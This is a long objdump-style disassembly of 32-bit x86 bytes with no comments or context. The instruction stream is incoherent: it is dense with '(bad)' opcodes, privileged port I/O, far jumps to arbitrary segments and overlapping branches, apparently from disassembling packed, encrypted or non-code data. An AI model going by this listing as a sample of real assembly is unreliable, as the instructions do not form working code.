  41278f:	mov    esp,0x29db1cd3
  412794:	outs   dx,BYTE PTR ds:[esi]
  412795:	imul   eax,DWORD PTR [eax-0x1616d2dc],0xe55ef36
  41279f:	mov    ah,0xb9
  4127a1:	scas   eax,DWORD PTR es:[edi]
  4127a2:	shl    DWORD PTR [edi-0x15],cl
  4127a5:	std    
  4127a6:	mov    edi,0xca0cfb14
  4127ab:	jmp    0x453a6c2
  4127b0:	rol    al,cl
  4127b2:	push   edi
  4127b3:	jnp    0x4127f0
  4127b5:	js     0x412816
  4127b7:	mov    dl,0x3a
  4127b9:	pop    es
  4127ba:	(bad)  [eax+0x159258b2]
  4127c0:	dec    ebx
  4127c1:	int    0xdc
  4127c3:	inc    ebp
  4127c4:	push   ds
  4127c5:	stos   DWORD PTR es:[edi],eax
  4127c6:	seto   BYTE PTR [edx]
  4127c9:	inc    edx
  4127ca:	mov    ebp,0xe3b98ca9
  4127cf:	jbe    0x4127fc
  4127d1:	ret    0x8a46
  4127d4:	test   DWORD PTR [edi+0x4f],edi
  4127d7:	repz (bad) [esi+0x4a]
  4127db:	ins    DWORD PTR es:[edi],dx
  4127dc:	loope  0x4127a8
  4127de:	hlt    
  4127df:	xchg   ebp,eax
  4127e0:	fmul   QWORD PTR [eax+0x542feca4]
  4127e6:	mov    dl,0x85
  4127e8:	sub    eax,DWORD PTR [esp+ebx*1+0x40]
  4127ec:	mov    ch,0xb0
  4127ee:	jmp    FWORD PTR [ecx+0x230f0890]
  4127f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f5:	xchg   ebx,eax
  4127f6:	stc    
  4127f7:	in     eax,0xe0
  4127f9:	call   0x127fcafb
  4127fe:	out    dx,eax
  4127ff:	gs dec esi
  412801:	enter  0xc7c4,0x31
  412805:	sar    BYTE PTR [esi+0x7f10d592],cl
  41280b:	leave  
  41280c:	mov    fs,edx
  41280e:	popa   
  41280f:	pop    ebp
  412810:	mov    ebp,0xcba83faa
  412815:	mov    cl,BYTE PTR [ebp+0x71bed04a]
  41281b:	xor    DWORD PTR [edx],ecx
  41281d:	clc    
  41281e:	and    DWORD PTR [edi+0x4d],edi
  412821:	pop    es
  412822:	iret   
  412823:	iret   
  412824:	or     edx,DWORD PTR [eax+0xd]
  412827:	aas    
  412828:	xlat   BYTE PTR ds:[ebx]
  412829:	loopne 0x412814
  41282b:	lods   al,BYTE PTR ds:[esi]
  41282c:	outs   dx,BYTE PTR gs:[esi]
  41282e:	ret    
  41282f:	push   0x88ca7baa
  412834:	push   DWORD PTR ds:0x2b6904bc
  41283a:	mov    ebx,DWORD PTR [ecx+0x7a]
  41283d:	xor    BYTE PTR [edi+0x117995e3],al
  412843:	out    dx,al
  412844:	aad    0xd1
  412846:	add    al,0x9e
  412848:	adc    BYTE PTR [edi+0x57],ch
  41284b:	ror    DWORD PTR [edx+0x6f],cl
  41284e:	inc    ecx
  41284f:	cmp    DWORD PTR [esi-0xdd8bd1a],ebp
  412855:	pop    ecx
  412856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412857:	enter  0x99ad,0x3f
  41285b:	adc    DWORD PTR [edx+0x5],esp
  41285e:	fs test al,0x38
  412861:	xchg   BYTE PTR [ecx],cl
  412863:	out    dx,eax
  412864:	pushf  
  412865:	ins    DWORD PTR es:[edi],dx
  412866:	pop    edi
  412867:	adc    al,0x3c
  412869:	mov    ds:0x6e5eb938,eax
  41286e:	sub    BYTE PTR [ecx],ch
  412870:	mov    DWORD PTR [ecx+0x46da6ad0],esp
  412876:	nop
  412877:	add    DWORD PTR [edi-0x389da7e7],esi
  41287d:	xchg   BYTE PTR [ebp+0x2f],ah
  412880:	pop    ss
  412881:	scas   al,BYTE PTR es:[edi]
  412882:	int3   
  412883:	mov    eax,0x3cb25211
  412888:	nop
  412889:	push   ebp
  41288a:	push   cs
  41288b:	std    
  41288c:	add    BYTE PTR [edi],0x68
  41288f:	cli    
  412890:	adc    al,0x2e
  412892:	imul   edi,ecx,0x5a
  412895:	xor    al,0x8
  412897:	jnp    0x41285b
  412899:	mov    al,0x9a
  41289b:	cmp    ah,BYTE PTR [ecx-0x51]
  41289e:	and    BYTE PTR [ecx],cl
  4128a0:	lds    esi,FWORD PTR [edi+0x6067138f]
  4128a6:	call   0x45c4:0xb7cd1fb7
  4128ad:	push   ebp
  4128ae:	jge    0x412833
  4128b0:	push   edx
  4128b1:	cmp    dl,BYTE PTR ds:0x6b5e3195
  4128b7:	pop    ecx
  4128b8:	pop    ebx
  4128b9:	pop    ds
  4128ba:	and    DWORD PTR [bx+di-0x608f],eax
  4128bf:	push   ecx
  4128c0:	call   0x3cd3:0xd27f30ef
  4128c7:	lods   al,BYTE PTR ds:[esi]
  4128c8:	mov    esp,0x70f8ef5d
  4128cd:	add    DWORD PTR [edx-0x3e89c6ce],esi
  4128d3:	or     bh,BYTE PTR [ebx]
  4128d5:	push   ebx
  4128d6:	adc    dh,BYTE PTR ds:0x417e03bc
  4128dc:	in     al,dx
  4128dd:	into   
  4128de:	add    al,bh
  4128e0:	jne    0x41292c
  4128e2:	stos   DWORD PTR es:[edi],eax
  4128e3:	in     eax,dx
  4128e4:	ficom  DWORD PTR [eax]
  4128e6:	daa    
  4128e7:	inc    edx
  4128e8:	push   edi
  4128e9:	inc    esi
  4128ea:	repz les edx,FWORD PTR [edi+0x477b70d4]
  4128f1:	fistp  DWORD PTR [esi+0x1fc2bfeb]
  4128f7:	xor    ecx,DWORD PTR ds:0x5606d9bf
  4128fd:	adc    eax,0x8a121f17
  412902:	jmp    FWORD PTR [edx-0x76]
  412905:	in     al,dx
  412906:	out    0x9,eax
  412908:	xor    al,BYTE PTR [ebx-0x790af7a7]
  41290e:	pop    ebp
  41290f:	push   esi
  412910:	push   ds
  412911:	or     ebx,DWORD PTR [ecx-0x7]
  412914:	lds    ebp,FWORD PTR [eax+0x54f89623]
  41291a:	mov    esp,0x9b697abb
  41291f:	fistp  DWORD PTR [esi]
  412921:	xor    eax,0x3dacf020
  412926:	mov    DWORD PTR [edx+esi*2+0x76f7543c],ebx
  41292d:	dec    ebx
  41292e:	inc    esi
  41292f:	imul   edi,DWORD PTR [ecx-0x42],0xffffffc6
  412933:	xchg   esi,eax
  412934:	xor    BYTE PTR ds:0xa3fcd24f,0xe0
  41293b:	rcr    DWORD PTR [edi+0x55],1
  41293e:	outs   dx,DWORD PTR ds:[esi]
  41293f:	cmp    eax,0x7e36fbcf
  412944:	ins    DWORD PTR es:[edi],dx
  412945:	inc    ebp
  412946:	iret   
  412947:	mov    bl,0xc3
  412949:	xchg   DWORD PTR [eax+0x3f2d1f41],esp
  41294f:	pop    esp
  412950:	mov    edx,0x5931fbc8
  412955:	pop    edx
  412956:	pop    ds
  412957:	leave  
  412958:	lods   eax,DWORD PTR ds:[esi]
  412959:	mov    dl,0xe6
  41295b:	mov    BYTE PTR [ecx],al
  41295d:	push   ebp
  41295e:	and    ecx,DWORD PTR [ecx+0x3ac5dda]
  412964:	add    eax,0xb1730e0a
  412969:	sbb    eax,0x123de45
  41296e:	cmp    BYTE PTR [ebx+0x19],dh
  412971:	push   esp
  412972:	add    al,0x75
  412974:	dec    ebx
  412975:	aad    0xe7
  412977:	push   ss
  412978:	xor    ah,dh
  41297a:	jmp    0x32d706c1
  41297f:	into   
  412980:	mov    edi,0x9fa9a383
  412985:	pop    ds
  412986:	mov    esp,0x33ff5b7d
  41298b:	push   ebx
  41298c:	dec    edi
  41298d:	inc    ecx
  41298e:	ror    BYTE PTR [ebp+0x6e],cl
  412991:	cmp    eax,0x64738fbb
  412996:	and    bl,0xab
  412999:	sahf   
  41299a:	out    dx,al
  41299b:	inc    ebx
  41299c:	inc    edx
  41299d:	add    DWORD PTR [edx+eax*8],esp
  4129a0:	(bad)  
  4129a2:	jne    0x412942
  4129a4:	and    ebx,DWORD PTR [edi]
  4129a6:	sbb    eax,0x2d55570b
  4129ab:	ins    DWORD PTR es:[edi],dx
  4129ac:	pop    ds
  4129ad:	shl    BYTE PTR [ecx+edi*8],0x49
  4129b1:	int    0x3a
  4129b3:	adc    dh,BYTE PTR [eax-0x42]
  4129b6:	mov    al,0xc3
  4129b8:	shl    ch,cl
  4129ba:	imul   ebp,DWORD PTR [ebp-0x5373567c],0x557cf63d
  4129c4:	test   BYTE PTR [edx+0x7],bh
  4129c7:	pop    esi
  4129c8:	push   cs
  4129c9:	lds    ebx,FWORD PTR [ecx]
  4129cb:	mov    al,ds:0x2fd079c9
  4129d0:	inc    esi
  4129d1:	sbb    al,0x69
  4129d3:	stos   BYTE PTR es:[edi],al
  4129d4:	dec    edx
  4129d5:	lahf   
  4129d6:	or     bl,BYTE PTR [ebx+0x22]
  4129d9:	inc    esp
  4129da:	mov    ecx,0x410adfd1
  4129df:	ret    0x190d
  4129e2:	add    DWORD PTR [esi-0x52],esp
  4129e5:	retf   
  4129e6:	add    BYTE PTR [esi],dl
  4129e8:	xchg   edi,eax
  4129e9:	sub    eax,0xcaef0cdd
  4129ee:	sbb    DWORD PTR [eax],0x18
  4129f1:	imul   eax,DWORD PTR [edi-0x6],0x67
  4129f5:	ffree  st(3)
  4129f7:	or     BYTE PTR [ecx-0x5c41c1fb],0x41
  4129fe:	xchg   ebx,eax
  4129ff:	popa   
  412a00:	setae  BYTE PTR [ebx]
  412a03:	je     0x412a23
  412a05:	imul   ebp,edi,0x3f
  412a08:	jno    0x412a67
  412a0a:	out    dx,eax
  412a0b:	jl     0x412994
  412a0d:	enter  0xd078,0x3a
  412a11:	icebp  
  412a12:	inc    ebx
  412a13:	mov    dh,0x19
  412a15:	(bad)  
  412a16:	mov    ebp,0x4c6aa432
  412a1b:	cwde   
  412a1c:	pop    es
  412a1d:	mov    WORD PTR [ebx-0x5fdd5598],gs
  412a23:	push   ebx
  412a24:	and    al,0x2c
  412a26:	call   0xfeb3e83b
  412a2b:	ss cwde 
  412a2d:	push   esp
  412a2e:	or     al,0xf3
  412a30:	pop    ds
  412a31:	xchg   esp,eax
  412a32:	jo     0x4129e8
  412a34:	inc    ebp
  412a35:	mov    al,0x68
  412a37:	outs   dx,BYTE PTR ds:[esi]
  412a38:	add    eax,0x89d863bd
  412a3d:	xchg   ebp,eax
  412a3e:	inc    esi
  412a3f:	sub    eax,DWORD PTR [edi]
  412a41:	mov    al,cl
  412a43:	or     cl,bh
  412a45:	fwait
  412a46:	jp     0x412a3a
  412a48:	fstp   DWORD PTR [ebx+0x0]
  412a4b:	sbb    DWORD PTR [esi],ebx
  412a4d:	xor    edx,DWORD PTR ds:0x81211e67
  412a53:	jae    0x412a02
  412a55:	dec    ebx
  412a56:	inc    esp
  412a57:	or     DWORD PTR [eax+0x40],edx
  412a5a:	cmp    DWORD PTR [esi+0x3b8faf28],esp
  412a60:	fist   DWORD PTR [esi-0x2b369ce7]
  412a66:	push   ecx
  412a67:	(bad)  
  412a68:	cdq    
  412a69:	jns    0x412a2d
  412a6b:	mov    ebp,DWORD PTR [edi]
  412a6d:	test   DWORD PTR [ecx],edx
  412a6f:	sbb    esp,ecx
  412a71:	xchg   esp,eax
  412a72:	and    eax,0xbf2fa4ff
  412a77:	jno    0x412a10
  412a79:	add    BYTE PTR [ecx],dh
  412a7b:	and    DWORD PTR [ecx],edx
  412a7d:	sbb    al,0xa4
  412a7f:	pop    ebx
  412a80:	ss dec esp
  412a82:	mov    ecx,0xa1976540
  412a87:	sub    al,0xf0
  412a89:	es mov ebx,0xb9c6481f
  412a8f:	xor    edi,DWORD PTR [eax]
  412a91:	pusha  
  412a92:	mov    ebp,0xd19a919
  412a97:	popf   
  412a98:	dec    ebp
  412a99:	adc    eax,ebx
  412a9b:	stc    
  412a9c:	xor    DWORD PTR [edx+0x28052b3c],eax
  412aa2:	clc    
  412aa3:	add    BYTE PTR [ebp+ebx*2-0x17],ch
  412aa7:	and    eax,0x4d32743e
  412aac:	scas   al,BYTE PTR es:[edi]
  412aad:	mov    edi,0xe8a66971
  412ab2:	jmp    0xe027fe5e
  412ab7:	enter  0xcacf,0x81
  412abb:	aaa    
  412abc:	mov    ch,0xd
  412abe:	inc    esp
  412abf:	mov    ebx,ebp
  412ac1:	sub    eax,0xdad59d0a
  412ac6:	scas   al,BYTE PTR es:[edi]
  412ac7:	dec    ebx
  412ac8:	ins    BYTE PTR es:[edi],dx
  412ac9:	in     al,dx
  412aca:	repz daa 
  412acc:	mov    dl,0xd3
  412ace:	push   ebp
  412acf:	mov    eax,ds:0x174a2189
  412ad4:	xor    al,BYTE PTR [edx+0x45]
  412ad7:	mov    cl,0x6e
  412ad9:	or     DWORD PTR [eax+0x77],ebp
  412adc:	add    al,0x75
  412ade:	xchg   ebp,eax
  412adf:	leave  
  412ae0:	and    esi,DWORD PTR fs:[eax+0x51292dce]
  412ae7:	pop    edi
  412ae8:	imul   edi,DWORD PTR [ecx+0x61],0x2b
  412aec:	cmp    DWORD PTR [ebx+0x32],ebx
  412aef:	or     esp,DWORD PTR [eax]
  412af1:	mov    ?,eax
  412af3:	sub    eax,0x85070a65
  412af8:	lea    ebx,[ecx-0x76]
  412afb:	test   eax,0xcd043af9
  412b00:	(bad)  
  412b01:	mov    al,ds:0x6a471691
  412b06:	push   eax
  412b07:	pop    es
  412b08:	cld    
  412b09:	xor    BYTE PTR [ebx+ebx*1+0x14ad9374],0x85
  412b11:	adc    DWORD PTR [eax],0xffffff9a
  412b14:	imul   ebp,ebx,0x6a
  412b17:	mov    ch,0xfb
  412b19:	leave  
  412b1a:	xor    DWORD PTR ds:0x946dba4a,esp
  412b20:	ja     0x412b1e
  412b22:	add    bh,ah
  412b24:	repnz int3 
  412b26:	inc    esp
  412b27:	imul   eax,DWORD PTR [eax+0x1d7be1a7],0xf
  412b2e:	add    DWORD PTR [edi],0xa5babe8c
  412b34:	(bad)  
  412b35:	imul   esp,DWORD PTR [ebx-0x39b06596],0xe17b68fb
  412b3f:	push   ds
  412b40:	repz sub DWORD PTR [edi],edx
  412b43:	cli    
  412b44:	(bad)  
  412b46:	pop    ss
  412b47:	mov    bh,0x63
  412b49:	cmp    DWORD PTR [edx],edi
  412b4b:	or     ebp,DWORD PTR [ecx+0x2a]
  412b4e:	(bad)  
  412b4f:	push   0x5f
  412b51:	retf   0x43fc
  412b54:	scas   eax,DWORD PTR es:[edi]
  412b55:	pushf  
  412b56:	push   ss
  412b57:	add    ch,ah
  412b59:	adc    bh,ah
  412b5b:	(bad)  
  412b5c:	scas   eax,DWORD PTR es:[edi]
  412b5d:	mov    bl,BYTE PTR [edx]
  412b5f:	push   ds
  412b60:	adc    eax,0x6357577a
  412b65:	fs mov eax,0x684203ee
  412b6b:	jmp    0x4b5f9dbd
  412b70:	sbb    DWORD PTR [eax*2+0x3a73610f],ebx
  412b77:	loop   0x412b72
  412b79:	add    DWORD PTR [eax+0x5220682e],ebx
  412b7f:	pop    ds
  412b80:	retf   
  412b81:	cmc    
  412b82:	(bad)  
  412b83:	mov    BYTE PTR [ebp-0x5a],cl
  412b86:	adc    BYTE PTR [ebp-0x6a4145c4],al
  412b8c:	in     eax,0xe0
  412b8e:	push   edi
  412b8f:	jge    0x412b8b
  412b91:	rcr    dl,0x70
  412b94:	pop    esi
  412b95:	xchg   esp,eax
  412b96:	inc    edi
  412b97:	(bad)  
  412b98:	test   BYTE PTR [esi+0x159984c9],dh
  412b9e:	jbe    0x412c01
  412ba0:	leave  
  412ba1:	xor    esp,DWORD PTR [edx-0x7d792444]
  412ba7:	sti    
  412ba8:	pop    ecx
  412ba9:	dec    eax
  412baa:	imul   ebp,DWORD PTR [ebp-0x7ea7cfe0],0x36b543a1
  412bb4:	das    
  412bb5:	iret   
  412bb6:	jge    0x412c0d
  412bb8:	lods   al,BYTE PTR ds:[esi]
  412bb9:	int3   
  412bba:	mov    esp,0xc1c91531
  412bbf:	addr16 inc edi
  412bc1:	imul   esp,DWORD PTR [eax+0x77b66cbc],0x62
  412bc8:	fs repz sub eax,0xf479b8d2
  412bcf:	icebp  
  412bd0:	mov    ds:0xff74559e,eax
  412bd5:	jmp    0x412c00
  412bd7:	(bad)  [ecx+0x4b]
  412bda:	das    
  412bdb:	inc    ecx
  412bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdd:	call   0x112c:0xf4cfd0eb
  412be4:	loope  0x412c05
  412be6:	jno    0x412ba4
  412be8:	jne    0x412c19
  412bea:	popf   
  412beb:	cmp    BYTE PTR [esi],0x5f
  412bee:	cmp    ebx,DWORD PTR [esi]
  412bf0:	fdivr  QWORD PTR [esi+eiz*1]
  412bf3:	shl    DWORD PTR ds:0xfd788a72,cl
  412bf9:	add    cl,BYTE PTR [ecx+edx*1-0x3]
  412bfd:	retf   0x131c
  412c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c01:	sub    eax,0x1961ad4f
  412c06:	pop    ebx
  412c07:	push   ebx
  412c08:	lods   eax,DWORD PTR ds:[esi]
  412c09:	ficom  WORD PTR [edx+0x4b4b9a76]
  412c0f:	and    al,0xe8
  412c11:	mov    ch,BYTE PTR [edx-0x6]
  412c14:	mov    al,ds:0xd068de34
  412c19:	inc    eax
  412c1a:	xchg   esp,eax
  412c1b:	mov    bl,0x73
  412c1d:	sub    ecx,edi
  412c1f:	es pop ss
  412c21:	fbstp  TBYTE PTR [ebx]
  412c23:	and    edi,DWORD PTR [ebp-0x5a]
  412c26:	lds    ebx,FWORD PTR [ebx-0x2d8e979]
  412c2c:	repnz hlt 
  412c2e:	adc    ah,bh
  412c30:	in     eax,0x6d
  412c32:	repz stc 
  412c34:	pop    ebp
  412c35:	jo     0x412be4
  412c37:	jns    0x412bc3
  412c39:	xor    BYTE PTR [eax],dl
  412c3b:	fadd   QWORD PTR [ebx+0x545923a0]
  412c41:	or     eax,0x525f6f84
  412c46:	adc    cl,bl
  412c48:	stos   BYTE PTR es:[edi],al
  412c49:	mov    al,0x7e
  412c4b:	jno    0x412c1f
  412c4d:	ja     0x412c1e
  412c4f:	ja     0x412c84
  412c51:	fiadd  DWORD PTR [eax-0x5c]
  412c54:	leave  
  412c55:	scas   al,BYTE PTR es:[edi]
  412c56:	scas   eax,DWORD PTR es:[edi]
  412c57:	arpl   WORD PTR [ecx-0x3],di
  412c5a:	outs   dx,BYTE PTR ds:[esi]
  412c5b:	mov    ds,WORD PTR [ecx+0x7cf7e74f]
  412c61:	jnp    0x412cc6
  412c63:	sub    ch,bl
  412c65:	int    0x70
  412c67:	jno    0x412c57
  412c69:	stc    
  412c6a:	leave  
  412c6b:	and    eax,0x5a305f30
  412c70:	lock xor BYTE PTR [eax+esi*8],cl
  412c74:	dec    eax
  412c75:	pop    ds
  412c76:	push   0x2a74498d
  412c7b:	test   DWORD PTR [edx+0x2c15d149],eax
  412c81:	in     eax,dx
  412c82:	jne    0x412c76
  412c84:	mov    ebx,0x481d9575
  412c89:	cs popf 
  412c8b:	xchg   ebx,eax
  412c8c:	push   0x2637bad2
  412c91:	imul   ebx,DWORD PTR [ecx],0xffffff8e
  412c94:	pushf  
  412c95:	push   edi
  412c96:	into   
  412c97:	mov    DWORD PTR [esi+0x51],0x31df78c0
  412c9e:	dec    eax
  412c9f:	fidivr WORD PTR [edx]
  412ca1:	xchg   edi,eax
  412ca2:	rol    DWORD PTR [esi+0x12],cl
  412ca5:	cdq    
  412ca6:	popa   
  412ca7:	mov    al,ch
  412ca9:	mov    edx,0x10b178a1
  412cae:	das    
  412caf:	(bad)  
  412cb0:	shr    cl,1
  412cb2:	inc    eax
  412cb3:	xchg   esi,eax
  412cb4:	pop    edx
  412cb5:	in     al,0x7f
  412cb7:	aad    0x84
  412cb9:	mov    eax,0x2038fad0
  412cbe:	punpcklbw mm2,mm7
  412cc1:	jbe    0x412cbd
  412cc3:	xchg   edi,eax
  412cc4:	retf   
  412cc5:	sbb    al,0x93
  412cc7:	add    ch,ah
  412cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cca:	scas   al,BYTE PTR es:[edi]
  412ccb:	ftst   
  412ccd:	test   esp,eax
  412ccf:	test   al,0xdc
  412cd1:	hlt    
  412cd2:	adc    DWORD PTR [ebx-0x1ec51168],0x63
  412cd9:	jmp    0xc208:0x6dea9213
  412ce0:	stos   BYTE PTR es:[edi],al
  412ce1:	xor    BYTE PTR [edi],0x8c
  412ce4:	aaa    
  412ce5:	retf   0x631f
  412ce8:	and    eax,0xd7f3ce5c
  412ced:	mov    edx,DWORD PTR [eax]
  412cef:	repz clc 
  412cf1:	aaa    
  412cf2:	push   ss
  412cf3:	adc    BYTE PTR [ebx],ch
  412cf5:	inc    ebp
  412cf6:	std    
  412cf7:	jge    0x412cf2
  412cf9:	scas   al,BYTE PTR es:[edi]
  412cfa:	inc    esp
  412cfb:	sub    DWORD PTR [edi],esi
  412cfd:	lahf   
  412cfe:	jne    0x412cff
  412d00:	fisubr WORD PTR [eax+0x3245fb17]
  412d06:	adc    eax,0x32a16bda
  412d0b:	xlat   BYTE PTR ds:[ebx]
  412d0c:	xchg   edi,eax
  412d0d:	fcomp  QWORD PTR [ebp+ebx*1+0x629a9e23]
  412d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d15:	(bad)  [esi+0xf56cccf]
  412d1b:	lds    edx,FWORD PTR ds:0xb4843532
  412d21:	call   0xe313bf46
  412d26:	inc    edi
  412d27:	jae    0x412cf8
  412d29:	push   edi
  412d2a:	outs   dx,DWORD PTR ds:[esi]
  412d2b:	sub    al,0xcb
  412d2d:	fist   DWORD PTR [ecx]
  412d2f:	fisubr WORD PTR [eax+0x4c786bc7]
  412d35:	retf   0xe769
  412d38:	(bad)  
  412d3a:	push   cs
  412d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d3c:	add    eax,0x9e3f3088
  412d41:	pop    ss
  412d42:	xor    al,0x55
  412d44:	and    ah,BYTE PTR [ecx]
  412d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d47:	icebp  
  412d48:	arpl   WORD PTR [edx+0x477de802],dx
  412d4e:	inc    ebp
  412d4f:	or     BYTE PTR [edi-0x3d],dl
  412d52:	xchg   DWORD PTR [edx+0x35],esp
  412d55:	rcl    DWORD PTR [esi+ebx*1],cl
  412d58:	pop    ebp
  412d59:	call   0x9baf:0x41a6bdd0
  412d60:	retf   0x6e9c
  412d63:	inc    ebp
  412d64:	sub    DWORD PTR [ecx],ecx
  412d66:	pop    ss
  412d67:	dec    ebx
  412d68:	mov    edi,0x88379012
  412d6d:	pop    ss
  412d6e:	push   ecx
  412d6f:	ds push ds
  412d71:	adc    al,0x36
  412d73:	aaa    
  412d74:	nop
  412d75:	nop
  412d76:	popa   
  412d77:	mov    bh,0x2a
  412d79:	sti    
  412d7a:	call   0x8c86:0xf74901ec
  412d81:	(bad)  
  412d82:	xchg   ecx,eax
  412d83:	push   0xfffffff5
  412d85:	out    0xb9,eax
  412d87:	xchg   esp,eax
  412d88:	out    dx,al
  412d89:	ins    BYTE PTR es:[edi],dx
  412d8a:	sub    eax,DWORD PTR [esi-0x61f14f10]
  412d90:	loopne 0x412ddf
  412d92:	push   eax
  412d93:	outs   dx,BYTE PTR ds:[esi]
  412d94:	fmul   QWORD PTR [ebp+0x2e3c3251]
  412d9a:	lods   al,BYTE PTR ds:[esi]
  412d9b:	push   ebx
  412d9c:	add    al,0xb5
  412d9e:	loop   0x412dbe
  412da0:	adc    BYTE PTR [eax+0x74],bl
  412da3:	ja     0x412e08
  412da5:	imul   BYTE PTR [esi+esi*8+0x111075e6]
  412dac:	mov    edi,0x49317b45
  412db1:	test   BYTE PTR [edi],ch
  412db3:	idiv   dh
  412db5:	xor    al,0x86
  412db7:	push   edi
  412db8:	mov    edx,0x1c6b4307
  412dbd:	xlat   BYTE PTR ds:[ebx]
  412dbe:	dec    edx
  412dbf:	jle    0x412e14
  412dc1:	mov    ds:0xf6f72e1b,eax
  412dc6:	xor    eax,0x2f49bd4b
  412dcb:	mov    dl,0xda
  412dcd:	adc    DWORD PTR [edi+0xb],eax
  412dd0:	pop    esi
  412dd1:	sub    DWORD PTR [ebx+0x61],0xffffff9b
  412dd5:	call   0x95c6ce0a
  412dda:	push   ebp
  412ddb:	test   eax,0xedd98f88
  412de0:	cmp    DWORD PTR [eax-0x5b585e19],ebp
  412de6:	test   al,0xe7
  412de8:	inc    edi
  412de9:	imul   ebx,DWORD PTR [ecx+0x2b],0xffffffd6
  412ded:	popa   
  412dee:	fwait
  412def:	dec    eax
  412df0:	and    DWORD PTR [edx+0x40],0xaac63b66
  412df7:	cs pop ebx
  412df9:	iret   
  412dfa:	jmp    0xbf4:0x87226ed2
  412e01:	xchg   esi,eax
  412e02:	ins    BYTE PTR es:[edi],dx
  412e03:	aad    0x7d
  412e05:	out    0xac,eax
  412e07:	fimul  DWORD PTR [ebp-0x14829e73]
  412e0d:	fimul  DWORD PTR [esi+0x43430db0]
  412e13:	das    
  412e14:	pushf  
  412e15:	xchg   edi,eax
  412e16:	jge    0x412dd2
  412e18:	dec    esi
  412e19:	stos   BYTE PTR es:[edi],al
  412e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e1b:	mov    cl,0xae
  412e1d:	sbb    eax,0x21ed625
  412e22:	or     DWORD PTR [esi-0x11],ebx
  412e25:	adc    esi,ecx
  412e27:	stos   BYTE PTR es:[edi],al
  412e28:	sbb    esp,DWORD PTR [ebx]
  412e2a:	loopne 0x412e66
  412e2c:	cmc    
  412e2d:	ss and ecx,eax
  412e30:	xchg   ecx,eax
  412e31:	jmp    0xa753:0xfd518a76
  412e38:	pop    esi
  412e39:	jmp    FWORD PTR [eax]
  412e3b:	stos   BYTE PTR es:[edi],al
  412e3c:	mov    ah,0x2a
  412e3e:	push   es
  412e3f:	repz neg BYTE PTR [edi-0x67]
  412e43:	test   BYTE PTR [edi+0x5b],bh
  412e46:	(bad)  [ecx-0x59]
  412e49:	ret    
  412e4a:	int    0xc4
  412e4c:	mov    ds:0x9a53312,eax
  412e51:	add    dl,dl
  412e53:	cmp    DWORD PTR [eax-0x57fc2c63],edx
  412e59:	xor    al,0x37
  412e5b:	push   ss
  412e5c:	sub    DWORD PTR [esi],esi
  412e5e:	mov    dl,0xaa
  412e60:	sub    BYTE PTR ds:0xba96cc1b,ah
  412e66:	mov    dh,0x36
  412e68:	mov    cl,0x9
  412e6a:	adc    dl,ch
  412e6c:	dec    esi
  412e6d:	adc    esp,DWORD PTR [ecx+eiz*2-0x3f564ff6]
  412e74:	dec    ecx
  412e75:	jg     0x412e4f
  412e77:	push   es
  412e78:	mov    eax,ds:0xd21696a8
  412e7d:	mov    WORD PTR [ebx+0x530252e1],ds
  412e83:	aam    0x85
  412e85:	mov    bl,0xa8
  412e87:	pushf  
  412e88:	lock out dx,eax
  412e8a:	cmp    eax,DWORD PTR [ebp-0x4cf6df2f]
  412e90:	daa    
  412e91:	data16 cld 
  412e93:	stos   BYTE PTR es:[edi],al
  412e94:	shl    DWORD PTR [ebx-0x10],cl
  412e97:	jmp    0x63c4:0x8608d5ff
  412e9e:	mov    ebx,0x1f9790ec
  412ea3:	jge    0x412e6b
  412ea5:	sbb    al,BYTE PTR [edx-0xd]
  412ea8:	jb     0x412f19
  412eaa:	mov    ebx,0xb86ec5fa
  412eaf:	stos   DWORD PTR es:[edi],eax
  412eb0:	loopne 0x412ead
  412eb2:	inc    ecx
  412eb3:	add    ah,ch
  412eb5:	ds xchg ebx,eax
  412eb7:	in     eax,0x5c
  412eb9:	mov    dh,0x8c
  412ebb:	inc    edi
  412ebc:	fcomp  QWORD PTR ds:0x33d61745
  412ec2:	sbb    eax,0x969f564d
  412ec7:	clc    
  412ec8:	loop   0x412e89
  412eca:	mov    ebp,0x6fb86416
  412ecf:	test   eax,0x643fba7a
  412ed4:	sub    esi,ebx
  412ed6:	in     al,0x86
  412ed8:	dec    esp
  412ed9:	outs   dx,DWORD PTR ds:[esi]
  412eda:	scas   eax,DWORD PTR es:[edi]
  412edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412edc:	jns    0x412ee1
  412ede:	lods   al,BYTE PTR ds:[esi]
  412edf:	imul   esi,ebp,0x34140ac8
  412ee5:	mov    dl,0x47
  412ee7:	out    dx,eax
  412ee8:	mov    al,0xe9
  412eea:	xor    DWORD PTR [eax-0x59a6a7a3],0x5
  412ef1:	fsub   QWORD PTR [edx+0x48ab4218]
  412ef7:	xchg   ecx,eax
  412ef8:	inc    ebx
  412ef9:	fidiv  WORD PTR [esi-0x5a]
  412efc:	(bad)  
  412efd:	jb     0x412ebe
  412eff:	mov    BYTE PTR [esi],bl
  412f01:	cmp    ebx,DWORD PTR [eax+0x15]
  412f04:	ficom  WORD PTR [ecx-0x3635a2e8]
  412f0a:	cmovb  esi,DWORD PTR [edi]
  412f0d:	pop    ss
  412f0e:	cmp    dl,BYTE PTR [ebx+0x70325115]
  412f14:	in     al,0x25
  412f16:	sbb    bh,BYTE PTR [ebx-0x3afa6a15]
  412f1c:	stos   BYTE PTR es:[edi],al
  412f1d:	in     eax,dx
  412f1e:	(bad)  
  412f20:	mov    esi,0x661eb537
  412f25:	mov    bl,0x5b
  412f27:	jae    0x412f55
  412f29:	clc    
  412f2a:	mov    eax,ds:0x4fcb1c93
  412f2f:	inc    eax
  412f30:	fistp  WORD PTR [ebx]
  412f32:	xchg   esi,eax
  412f33:	aad    0xc2
  412f35:	adc    al,0xfc
  412f37:	rol    DWORD PTR [ebx],1
  412f39:	inc    edi
  412f3a:	es loopne 0x412f3d
  412f3d:	inc    eax
  412f3e:	push   ss
  412f3f:	mov    BYTE PTR [ebx],ch
  412f41:	int    0x2b
  412f43:	jnp    0x412f7b
  412f45:	(bad)  
  412f46:	daa    
